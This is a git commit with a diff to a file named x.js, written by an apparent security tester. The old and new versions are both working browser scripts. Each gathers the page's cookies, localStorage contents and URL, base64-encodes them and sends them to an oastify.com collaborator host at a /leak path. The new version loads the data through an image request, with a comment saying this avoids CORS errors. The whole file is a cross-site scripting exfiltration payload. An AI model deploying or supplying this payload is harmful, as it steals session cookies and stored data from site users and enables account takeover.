d7e98581b31a2767e5b2e6f754425d6e12f03213
AmirWilayah <119005771+AmirWilayah@users.noreply.github.com>
2025-07-08 01:00:36 +0800

    x.js

--- x.js
+++ x.js
@@ -1,6 +1,10 @@
-fetch("https://ebt4xhwz0ffgihdddc7oqtkympsgg84x.oastify.com/leak?" +
-  btoa(
-    "cookie=" + document.cookie +
-    "&ls=" + JSON.stringify(localStorage) +
-    "&url=" + location.href
-  ));
+const data = {
+  cookie: document.cookie,
+  localStorage: JSON.stringify(localStorage),
+  url: location.href
+};
+
+const encoded = btoa(JSON.stringify(data));
+
+// Leak using Image to avoid CORS error
+new Image().src = "https://ebt4xhwz0ffgihdddc7oqtkympsgg84x.oastify.com/leak?" + encoded;
